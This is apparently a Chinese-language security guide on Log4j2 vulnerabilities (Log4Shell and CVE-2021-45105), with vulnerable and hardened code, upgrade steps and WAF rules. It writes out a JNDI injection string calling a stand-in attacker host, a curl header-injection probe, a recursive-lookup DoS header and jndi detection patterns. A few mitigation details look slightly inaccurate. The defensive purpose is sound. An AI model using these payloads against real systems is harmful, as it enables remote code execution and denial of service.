---
id: LOG4J2
name: Log4j2 安全
severity: critical
cwe: ["CWE-502", "CWE-917"]
category: frameworks
frameworks: [Log4j2, Log4j API]
last_updated: "2026-04-18"
doc_version: "1.0"
---

# Log4j2 安全

> 最后更新：2026-04-18

## 概述

Apache Log4j2 是 Java 生态中最广泛使用的日志框架之一。2021 年 12 月披露的 Log4Shell（CVE-2021-44228）漏洞震惊了整个安全社区，该漏洞利用 Log4j2 的 JNDI Lookup 功能实现远程代码执行，影响范围极广，被称为"互联网级别的漏洞"。本文档整理 Log4j2 框架相关的安全问题。

## 历史漏洞

### Log4Shell (CVE-2021-44228)

| 属性 | 值 |
|------|------|
| CVE | CVE-2021-44228 |
| 影响版本 | Log4j2 2.0-beta9 ~ 2.14.1 |
| 严重程度 | 严重（CVSS 10.0） |
| 利用条件 | Log4j2 版本在受影响范围内，存在日志输出点 |

**漏洞原理**：Log4j2 支持通过 Lookups 机制在日志消息中解析特殊语法，其中 JNDI Lookup（`${jndi:...}`）允许从 JNDI 目录服务获取数据。攻击者在用户输入中嵌入 `${jndi:ldap://attacker.com/exploit}`，当日志框架处理该字符串时，会触发 JNDI 连接，从攻击者控制的 LDAP/RMI 服务加载恶意类，从而实现远程代码执行。

**攻击链路**：
1. 攻击者向目标应用提交包含 `${jndi:ldap://attacker.com/exploit}` 的请求
2. 应用将此输入记录到日志中
3. Log4j2 解析日志消息时触发 JNDI Lookup
4. 应用连接攻击者控制的 LDAP/RMI 服务器
5. LDAP 返回恶意 Reference 指向远程类加载地址
6. 受害应用加载并执行恶意类，实现 RCE

**常见注入点**：
- HTTP 请求头（User-Agent、X-Forwarded-For、Referer 等）
- URL 参数
- 表单字段
- 用户名/邮箱等用户输入字段
- 任何被记录到日志的数据

**检测方法**：
```bash
# 检测 Log4j2 版本
find / -name "log4j-core-*.jar" 2>/dev/null

# 使用检测工具
java -jar log4j-detector-2021.12.17.jar /path/to/scanner

# DNS 外带检测（需要 DNSLog 平台）
curl -H "X-Api-Version: ${jndi:ldap://xxx.dnslog.cn}" http://target/api
```

**修复措施**：
```xml
<!-- 升级 Log4j2 到安全版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.17.1</version>
</dependency>
```

```yaml
# 临时缓解措施：设置 JVM 参数禁用 JNDI Lookup
# Log4j2 >= 2.10.0
LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# Log4j2 >= 2.7
log4j2.formatMsgNoLookups=true
```

---

### Log4j2 递归查找 DoS (CVE-2021-45105)

| 属性 | 值 |
|------|------|
| CVE | CVE-2021-45105 |
| 影响版本 | Log4j2 2.0-beta9 ~ 2.16.0 |
| 严重程度 | 高危 |
| 利用条件 | Log4j2 版本在受影响范围内，存在日志输出点 |

**漏洞原理**：Log4j2 在处理递归 Lookup 时存在无限循环问题。当配置中使用上下文 Lookup（如 `${ctx:foo}`）且攻击者能控制 MDC（Mapped Diagnostic Context）数据时，可以构造 `${${::-${::-$${::-j}}}}` 等递归表达式，导致 StackOverflowError，造成拒绝服务。

**攻击示例**：
```http
GET /api HTTP/1.1
X-Forwarded-For: ${${::-${::-$${::-j}}}}
```

**修复措施**：
```xml
<!-- 升级 Log4j2 到 2.17.0+ -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

---

## 常见安全问题

### 1. 用户输入直接记录到日志

```java
// [VULNERABLE] 用户输入直接传入日志方法，可能触发 JNDI 注入
@GetMapping("/search")
public String search(@RequestParam String query) {
    logger.info("用户搜索: " + query);
    return searchService.search(query);
}
```

```java
// [SECURE] 对用户输入进行净化，移除 Lookup 触发字符
@GetMapping("/search")
public String search(@RequestParam String query) {
    String sanitized = query.replaceAll("\\$\\{", "").replaceAll("}", "");
    logger.info("用户搜索: {}", sanitized);
    return searchService.search(query);
}
```

### 2. JNDI Lookup 未禁用

```xml
<!-- [VULNERABLE] 默认配置允许 JNDI Lookup -->
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>
    </Appenders>
</Configuration>
```

```xml
<!-- [SECURE] 显式禁用 JNDI Lookup -->
<Configuration status="WARN">
    <Properties>
        <Property name="LOG4J_FORMAT_MSG_NO_LOOKUPS">true</Property>
    </Properties>
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n"/>
        </Console>
    </Appenders>
</Configuration>
```

### 3. 使用过旧的 Log4j2 版本

```xml
<!-- [VULNERABLE] 使用存在漏洞的旧版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

```xml
<!-- [SECURE] 使用安全版本 -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

## 安全配置建议

### 1. 升级到安全版本并禁用 Lookup

```xml
<!-- pom.xml -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version>
</dependency>
```

```properties
# application.properties - 禁用 JNDI Lookup
log4j2.formatMsgNoLookups=true
```

### 2. 使用安全的日志配置

```xml
<!-- log4j2.xml - 安全配置示例 -->
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN" shutdownHook="disable">
    <Properties>
        <Property name="LOG_PATTERN">%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n</Property>
    </Properties>
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <PatternLayout pattern="${LOG_PATTERN}"/>
        </Console>
        <RollingFile name="File" fileName="logs/app.log"
                     filePattern="logs/app-%d{yyyy-MM-dd}-%i.log">
            <PatternLayout pattern="${LOG_PATTERN}"/>
            <Policies>
                <TimeBasedTriggeringPolicy/>
                <SizeBasedTriggeringPolicy size="100MB"/>
            </Policies>
            <DefaultRolloverStrategy max="30"/>
        </RollingFile>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="File"/>
        </Root>
    </Loggers>
</Configuration>
```

### 3. JVM 层面加固

```bash
# 禁用 JNDI 远程类加载
JAVA_OPTS="$JAVA_OPTS -Dlog4j2.formatMsgNoLookups=true"
JAVA_OPTS="$JAVA_OPTS -Dcom.sun.jndi.ldap.object.trustURLCodebase=false"
JAVA_OPTS="$JAVA_OPTS -Dcom.sun.jndi.rmi.object.trustURLCodebase=false"
```

### 4. WAF 规则拦截

```
# 拦截常见 Log4j2 攻击模式
# 检测 ${jndi: 模式（含各种绕过变体）
SecRule ARGS|ARGS_NAMES|REQUEST_HEADERS "@contains ${jndi:" "id:1001,phase:2,deny,status:403,msg:'Log4j JNDI Injection Attempt'"
SecRule ARGS|ARGS_NAMES|REQUEST_HEADERS "@rx \$\{[^}]*jndi[^}]*\}" "id:1002,phase:2,deny,status:403,msg:'Log4j JNDI Injection Attempt (Obfuscated)'"
```

## 参考资料

- [Apache Log4j2 安全公告](https://logging.apache.org/log4j/2.x/security.html)
- [CVE-2021-44228 详情](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [CVE-2021-45105 详情](https://nvd.nist.gov/vuln/detail/CVE-2021-45105)
- [LunaSec Log4Shell 深度分析](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [Apache Log4j2 官方文档](https://logging.apache.org/log4j/2.x/)
- [CISA Log4Shell 缓解指南](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)
